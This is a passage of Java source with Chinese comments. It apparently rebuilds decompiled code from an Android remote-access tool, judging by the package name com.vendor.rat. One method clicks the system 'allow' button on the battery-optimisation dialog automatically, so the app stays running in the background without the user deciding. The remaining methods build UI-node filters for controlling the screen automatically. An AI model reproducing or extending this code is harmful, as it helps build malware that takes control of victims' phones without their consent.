     * 对应 vendor: o/a.java case 0 — 查找 android:id/button1 并点击
     */
    private void dismissBatteryOptimizationDialog() {
        try {
            UiNode root = getRootNode();
            if (root == null) {
                stateQueue.remove("keepInBatteryUnRestricted");
                return;
            }
            // vendor: 查找 android:id/button1 (允许按钮)
            com.vendor.rat.auto.condition.CombineFilter filter =
                com.vendor.rat.auto.condition.CombineFilter.and(
                    com.vendor.rat.auto.condition.StringCondition.className("android.widget.Button"),
                    com.vendor.rat.auto.condition.StringCondition.viewId("android:id/button1"));
            UiNode button = root.findOneByCombine(filter);
            if (button != null && button.click()) {
                Log.d(TAG, "已点击允许忽略电池优化");
            } else {
                Log.e(TAG, "允许忽略电池优化按钮未找到");
            }
            stateQueue.remove("keepInBatteryUnRestricted");
        } catch (Exception e) {
            Log.e(TAG, "dismissBatteryOptimizationDialog error", e);
            stateQueue.remove("keepInBatteryUnRestricted");
        }
    }

    /**
     * 检查对话框 + 屏幕状态
     * 对应 vendor: o/c.java Y() 行 437-449
     */
    public static boolean checkAndDismissDialog() {
        try {
            // vendor c.java:439: M() — 点击取消按钮
            // vendor c.java:440-443: 检查屏幕状态
            if (com.vendor.rat.utils.MiscUtils.isScreenOn()) {
                return true;
            }
            return false;
        } catch (Exception e) {
            Log.e(TAG, "checkAndDismissDialog error", e);
            return false;
        }
    }

    // ============ 通用 CombineFilter 构建器 — 对齐 vendor o/c.java ============

    /**
     * Switch 过滤器
     * 对应 vendor: o/c.java a0() 行 451-455
     */
    public static CombineFilter buildSwitchFilter() {
        return CombineFilter.switchWidget();
    }

    /**
     * clickable LinearLayout 过滤器
     * 对应 vendor: o/c.java K() 行 74-80
     */
    public static CombineFilter buildClickableLinearLayoutFilter() {
        return CombineFilter.and(
                StringCondition.className("android.widget.LinearLayout"),
                new com.vendor.rat.auto.condition.BoolCondition(
                        com.vendor.rat.auto.condition.BoolCondition.Property.CLICKABLE, true)
        );
    }

    /**
     * clickable 任意控件过滤器
     * 对应 vendor: o/c.java L() 行 82-87
     */
    public static CombineFilter buildClickableFilter() {
        return CombineFilter.clickable();
    }

    /**
     * LinearLayout 过滤器 (注意: 不是 scrollable!)
     * 对应 vendor: o/c.java U() 行 384-388
     */
    public static CombineFilter buildLinearLayoutFilter() {
        return CombineFilter.and(
                StringCondition.className("android.widget.LinearLayout")
        );
    }

    /**
     * scrollable OR 过滤器 (RecyclerView/ListView/ScrollView/任意scrollable)
     * 对应 vendor: o/c.java V() 行 390-429
     * ADAPT: vendor 返回 CombineFiltersWithOr, replica 返回 NodeFilter[]
     */
    public static NodeFilter[] buildScrollableOrFilters() {
        // Filter1: RecyclerView + scrollable
        NodeFilter f1 = CombineFilter.and(
                StringCondition.className("androidx.recyclerview.widget.RecyclerView"),
                new com.vendor.rat.auto.condition.BoolCondition(
                        com.vendor.rat.auto.condition.BoolCondition.Property.SCROLLABLE, true)
        );
        // Filter2: ListView + scrollable
        NodeFilter f2 = CombineFilter.and(
                StringCondition.className("android.widget.ListView"),
                new com.vendor.rat.auto.condition.BoolCondition(
                        com.vendor.rat.auto.condition.BoolCondition.Property.SCROLLABLE, true)
        );
        // Filter3: ScrollView + scrollable
        NodeFilter f3 = CombineFilter.and(
                StringCondition.className("android.widget.ScrollView"),
                new com.vendor.rat.auto.condition.BoolCondition(
                        com.vendor.rat.auto.condition.BoolCondition.Property.SCROLLABLE, true)
        );
        // Filter4: 任意 scrollable
        NodeFilter f4 = CombineFilter.scrollable();
        return new NodeFilter[]{f1, f2, f3, f4};
    }

    /**
     * TextView + text.contains 过滤器
     * 对应 vendor: o/c.java H(String) 行 45-53
     */
    public static CombineFilter buildTextViewContainsFilter(String text) {
        if (text == null || text.isEmpty()) return null;
        return CombineFilter.and(
                StringCondition.className("android.widget.TextView"),
                StringCondition.textContains(text)
        );
    }
}
